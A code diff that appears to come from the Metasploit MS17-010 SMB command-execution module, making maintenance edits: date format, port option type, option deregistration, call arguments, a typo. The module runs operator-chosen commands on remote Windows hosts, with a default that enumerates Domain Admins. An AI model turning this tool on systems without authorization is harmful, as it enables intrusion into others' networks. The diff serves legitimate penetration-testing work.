@@ -40,7 +40,7 @@ class MetasploitModule < Msf::Auxiliary
         [ 'URL', 'https://hitcon.org/2017/CMT/slide-files/d2_s2_r0.pdf' ],
         [ 'URL', 'https://blogs.technet.microsoft.com/srd/2017/06/29/eternal-champion-exploit-analysis/' ],
       ],
-      'DisclosureDate' => 'Mar 14 2017',
+      'DisclosureDate' => '2017-03-14',
       'Notes' =>
           {
               'AKA' => [
@@ -55,7 +55,7 @@ class MetasploitModule < Msf::Auxiliary
     register_options([
       OptString.new('SMBSHARE', [true, 'The name of a writeable share on the server', 'C$']),
       OptString.new('COMMAND', [true, 'The command you want to execute on the remote host', 'net group "Domain Admins" /domain']),
-      OptString.new('RPORT', [true, 'The Target port', 445]),
+      OptPort.new('RPORT', [true, 'The Target port', 445]),
       OptString.new('WINPATH', [true, 'The name of the remote Windows directory', 'WINDOWS']),
     ])
 
@@ -65,11 +65,10 @@ class MetasploitModule < Msf::Auxiliary
       OptInt.new('RETRY', [true, 'Retry this many times to check if the process is complete', 0]),
     ])
 
-    deregister_options('RHOST')
+    deregister_options('SMB::ProtocolVersion')
   end
 
   def run_host(ip)
-
     begin
       if datastore['SMBUser'].present?
         print_status("Authenticating to #{ip} as user '#{splitname(datastore['SMBUser'])}'...")
@@ -101,10 +100,10 @@ class MetasploitModule < Msf::Auxiliary
     @ip = ip
 
     # Try and authenticate with given credentials
-    output = execute_command_with_output(text, bat, datastore['COMMAND'], @smbshare, @ip, datastore['RETRY'], datastore['DELAY'])
+    output = execute_command_with_output(text, bat, datastore['COMMAND'], @smbshare, @ip, delay: datastore['DELAY'], retries: datastore['RETRY'])
 
     # Report output
-    print_good("Command completed successfuly!")
+    print_good("Command completed successfully!")
     print_status("Output for \"#{datastore['COMMAND']}\":\n")
     print_line("#{output}\n")
     report_note(
